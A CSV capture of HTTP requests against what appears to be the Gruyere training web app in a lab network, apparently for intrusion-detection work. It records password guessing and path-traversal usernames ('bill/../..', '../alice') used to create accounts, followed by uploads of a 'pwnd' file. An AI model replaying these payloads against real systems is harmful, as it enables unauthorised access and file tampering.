,source_ip,source_port,destination_ip,destination_port,raw_http_payload,scan_types
0,192.168.85.128,42854,192.168.85.129,8008,"b'GET /584433993583234906370287874446790819139/login?uid=Haadi&pw=111 HTTP/1.1\r\nHost: defender:8008\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nReferer: http://defender:8008/584433993583234906370287874446790819139/login\r\nCookie: GRUYERE=43169463|..||author\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'",
1,192.168.85.129,8008,192.168.85.128,42854,,
2,192.168.85.128,42856,192.168.85.129,8008,"b'GET /584433993583234906370287874446790819139/login?uid=Haadi&pw=112 HTTP/1.1\r\nHost: defender:8008\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nReferer: http://defender:8008/584433993583234906370287874446790819139/login?uid=Haadi&pw=111\r\nCookie: GRUYERE=43169463|..||author\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'",
3,192.168.85.129,8008,192.168.85.128,42856,,
4,192.168.85.128,42858,192.168.85.129,8008,"b'GET /584433993583234906370287874446790819139/login?uid=Haadi&pw=113 HTTP/1.1\r\nHost: defender:8008\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nReferer: http://defender:8008/584433993583234906370287874446790819139/login?uid=Haadi&pw=112\r\nCookie: GRUYERE=43169463|..||author\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'",
5,192.168.85.129,8008,192.168.85.128,42858,,
6,192.168.85.128,42860,192.168.85.129,8008,"b'GET /584433993583234906370287874446790819139/login?uid=Haado&pw=114 HTTP/1.1\r\nHost: defender:8008\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nReferer: http://defender:8008/584433993583234906370287874446790819139/login?uid=Haadi&pw=113\r\nCookie: GRUYERE=43169463|..||author\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'",
7,192.168.85.129,8008,192.168.85.128,42860,,
8,192.168.85.128,42864,192.168.85.129,8008,"b'GET /584433993583234906370287874446790819139/login?uid=Haadi&pw=123 HTTP/1.1\r\nHost: defender:8008\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nReferer: http://defender:8008/584433993583234906370287874446790819139/login?uid=Haado&pw=114\r\nCookie: GRUYERE=43169463|..||author\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'",
9,192.168.85.128,42870,192.168.85.129,8008,"b'GET /584433993583234906370287874446790819139/login?uid=tim%2F..&pw= HTTP/1.1\r\nHost: defender:8008\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nReferer: http://defender:8008/584433993583234906370287874446790819139/login\r\nCookie: GRUYERE=\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'",
10,192.168.85.128,42872,192.168.85.129,8008,"b'GET /584433993583234906370287874446790819139/login?uid=tim%2F..&pw=123 HTTP/1.1\r\nHost: defender:8008\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nReferer: http://defender:8008/584433993583234906370287874446790819139/login?uid=tim%2F..&pw=\r\nCookie: GRUYERE=\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'",
11,192.168.85.129,8008,192.168.85.128,42872,,
12,192.168.85.128,42894,192.168.85.129,8008,"b'GET /584433993583234906370287874446790819139/login HTTP/1.1\r\nHost: defender:8008\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nReferer: http://defender:8008/584433993583234906370287874446790819139/saveprofile?action=new&uid=bill%2F..%2F..&pw=123&is_author=True\r\nCookie: GRUYERE=30696322|bill/../..||author\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'",
13,192.168.85.128,42896,192.168.85.129,8008,"b'GET /584433993583234906370287874446790819139/upload.gtl HTTP/1.1\r\nHost: defender:8008\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nReferer: http://defender:8008/584433993583234906370287874446790819139/login\r\nCookie: GRUYERE=30696322|bill/../..||author\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'",
14,192.168.85.128,42898,192.168.85.129,8008,"b'POST /584433993583234906370287874446790819139/upload2 HTTP/1.1\r\nHost: defender:8008\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: multipart/form-data; boundary=---------------------------13441264615221574662933127095\r\nContent-Length: 232\r\nOrigin: http://defender:8008\r\nConnection: keep-alive\r\nReferer: http://defender:8008/584433993583234906370287874446790819139/upload.gtl\r\nCookie: GRUYERE=30696322|bill/../..||author\r\nUpgrade-Insecure-Requests: 1\r\n\r\n-----------------------------13441264615221574662933127095\r\nContent-Disposition: form-data; name=""upload_file""; filename=""secret.txt""\r\nContent-Type: text/plain\r\n\r\npwnd\n\r\n-----------------------------13441264615221574662933127095--\r\n'",
15,192.168.85.128,42902,192.168.85.129,8008,"b'GET /584433993583234906370287874446790819139/logout HTTP/1.1\r\nHost: defender:8008\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nReferer: http://defender:8008/584433993583234906370287874446790819139/upload2\r\nCookie: GRUYERE=30696322|bill/../..||author\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'",
16,192.168.85.128,42908,192.168.85.129,8008,"b'GET /584433993583234906370287874446790819139/login HTTP/1.1\r\nHost: defender:8008\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nReferer: http://defender:8008/584433993583234906370287874446790819139/saveprofile?action=new&uid=..%2Falice&pw=123&is_author=True\r\nCookie: GRUYERE=16006308|../alice||author\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'",
17,192.168.85.128,42910,192.168.85.129,8008,"b'GET /584433993583234906370287874446790819139/upload.gtl HTTP/1.1\r\nHost: defender:8008\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nReferer: http://defender:8008/584433993583234906370287874446790819139/login\r\nCookie: GRUYERE=16006308|../alice||author\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'",
18,192.168.85.128,42912,192.168.85.129,8008,"b'POST /584433993583234906370287874446790819139/upload2 HTTP/1.1\r\nHost: defender:8008\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: multipart/form-data; boundary=---------------------------234446713740382792862620298117\r\nContent-Length: 234\r\nOrigin: http://defender:8008\r\nConnection: keep-alive\r\nReferer: http://defender:8008/584433993583234906370287874446790819139/upload.gtl\r\nCookie: GRUYERE=16006308|../alice||author\r\nUpgrade-Insecure-Requests: 1\r\n\r\n-----------------------------234446713740382792862620298117\r\nContent-Disposition: form-data; name=""upload_file""; filename=""secret.txt""\r\nContent-Type: text/plain\r\n\r\npwnd\n\r\n-----------------------------234446713740382792862620298117--\r\n'",
19,192.168.85.128,42914,192.168.85.129,8008,"b'GET /584433993583234906370287874446790819139/logout HTTP/1.1\r\nHost: defender:8008\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nReferer: http://defender:8008/584433993583234906370287874446790819139/upload2\r\nCookie: GRUYERE=16006308|../alice||author\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'",
